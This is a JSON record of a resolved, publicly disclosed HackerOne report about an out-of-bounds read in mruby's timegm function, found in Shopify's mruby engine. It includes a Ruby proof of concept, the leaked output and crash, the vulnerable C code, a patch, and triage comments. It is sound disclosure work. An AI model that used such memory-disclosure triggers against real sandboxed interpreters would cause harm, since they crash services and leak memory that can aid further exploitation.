{"id":192896,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTI4OTY=","url":"https://hackerone.com/reports/192896","title":"Memory disclosure in timegm","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2016-12-20T23:15:59.341Z","submitted_at":"2016-12-20T23:15:59.341Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"volc","url":"/volc","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-01-31T23:41:39.854Z","bug_reporter_agreed_on_going_public_at":"2017-01-31T23:41:39.813Z","team_member_agreed_on_going_public_at":"2017-01-30T21:23:57.184Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"An attacker may disclose memory or/and crash mirb.\n\n# PoC\n\n```ruby\n@a = ''\nfor i in 0..50 do\n  t = Time.new(1970, 12 + i + 1).to_i - Time.new(1970, 12 + i).to_i\n  @a \u003c\u003c t.to_s(16)\n  @a \u003c\u003c \" \"\nend\n\n@a\n\nTime.new(1970, 0x10000)\n```\n\nOutput:\n\n```shell\n$ ./bin/mruby-engine-mirb \u003c timgm.rb \nmirb - Embeddable Interactive Ruby Shell\n\n\u003e * * * * *  =\u003e 0..50\n\u003e  =\u003e nil\n\u003e  =\u003e \"28de80 28de80 263b80 28de80 278d00 28de80 278d00 28de80 28de80 278d00 28de80 278d00 28de80 49dab380 ee655600 feabe80 98ee00 9facec80 97bc0380 c22e3e00 5b9a3280 c90abe00 4274900 6e4eec80 0 0 0 0 0 85430f00 b883c900 cb470380 defdb180 5c70380 9fa10f00 fca10f00 65153180 2d94ec80 70eca680 23bd5500 a012600 0 0 0 0 17e78500 0 54600 0 c3ae0f80 0 \"\n\u003e  =\u003e nil\n\u003e Segmentation fault\n```\n\n\n\n# Explanation\n\nThe vulnerability is located in the `timegm` function (`ext/mruby_engine/mruby-time/src/time.c`). The variable `tm-\u003etm_mon` is controlled by the attacker while it must be lower than 12. An out-of-bound access occurs if `tm-\u003etm_mon` is greater than 11, and the memory after the static array `ndays` is read.\n\n```C\nstatic time_t\ntimegm(struct tm *tm)\n{\n  static const unsigned int ndays[2][12] = {\n    {31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31},\n    {31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31}\n  };\n  time_t r = 0;\n  int i;\n  unsigned int *nday = (unsigned int*) ndays[is_leapyear(tm-\u003etm_year+1900)];\n\n  for (i = 70; i \u003c tm-\u003etm_year; ++i)\n    r += is_leapyear(i+1900) ? 366*24*60*60 : 365*24*60*60;\n  for (i = 0; i \u003c tm-\u003etm_mon; ++i)\n    r += nday[i] * 24 * 60 * 60;\n```\n\n\n\n# Impact\n\nAn attacker may:\n\n- crash mirb\n- read parts of the memory, which can help to build a reliable exploit thanks to an additional vulnerability\n\n\n\n# Patch\n\n```diff\ndiff --git a/ext/mruby_engine/mruby-time/src/time.c b/ext/mruby_engine/mruby-time/src/time.c\nindex 8884a5d..ce21043 100644\n--- a/ext/mruby_engine/mruby-time/src/time.c\n+++ b/ext/mruby_engine/mruby-time/src/time.c\n@@ -130,7 +130,7 @@ timegm(struct tm *tm)\n \n   for (i = 70; i \u003c tm-\u003etm_year; ++i)\n     r += is_leapyear(i+1900) ? 366*24*60*60 : 365*24*60*60;\n-  for (i = 0; i \u003c tm-\u003etm_mon; ++i)\n+  for (i = 0; i \u003c tm-\u003etm_mon \u0026\u0026 i \u003c 12; ++i)\n     r += nday[i] * 24 * 60 * 60;\n   r += (tm-\u003etm_mday - 1) * 24 * 60 * 60;\n   r += tm-\u003etm_hour * 60 * 60;\n```","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-03-01T21:23:57.233Z","allow_singular_disclosure_after":-145557264.63270828,"singular_disclosure_allowed":true,"vote_count":7,"voters":["marotagem_vrt","mpz","eveeez","khizer47","spetr0x","h4ck3r0ne","restdimension181117"],"severity":{"rating":"low","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1378292,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! Due to the holiday period and the large volume of reports we have received, it may take us up to three weeks to respond. We'll get to your report as soon as we can. Thank you for your patience!","automated_response":false,"created_at":"2016-12-21T00:11:25.111Z","updated_at":"2016-12-21T00:11:25.111Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1397770,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. I've reproduced the issue, and opened an issue upstream: https://github.com/mruby/mruby/issues/3368","automated_response":false,"created_at":"2017-01-04T00:04:00.267Z","updated_at":"2017-01-04T00:04:00.267Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1418812,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @volc, this issue was fixed upstream by https://github.com/mruby/mruby/commit/c4491e477b40adc842ef76e524647607780c8f25 (although your patch would have been adequate too)\n\nSince the issue was fixed, I'll close this report as Resolved now. Thank you for reporting this issue.\n\nFor your information, we usually pay bounties every 2 weeks, so our next round of payouts should be around January 23rd.","automated_response":false,"created_at":"2017-01-13T16:47:37.381Z","updated_at":"2017-01-13T16:47:37.381Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"volc","url":"/volc"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1452663,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify and the Mruby project!","automated_response":false,"created_at":"2017-01-30T21:23:50.805Z","updated_at":"2017-01-30T21:23:50.805Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"volc","url":"/volc"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1452665,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-01-30T21:23:57.203Z","updated_at":"2017-01-30T21:23:57.203Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1455157,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-01-31T23:41:39.829Z","updated_at":"2017-01-31T23:41:39.829Z","actor":{"username":"volc","cleared":false,"url":"/volc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1455158,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-01-31T23:41:39.870Z","updated_at":"2017-01-31T23:41:39.870Z","actor":{"username":"volc","cleared":false,"url":"/volc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}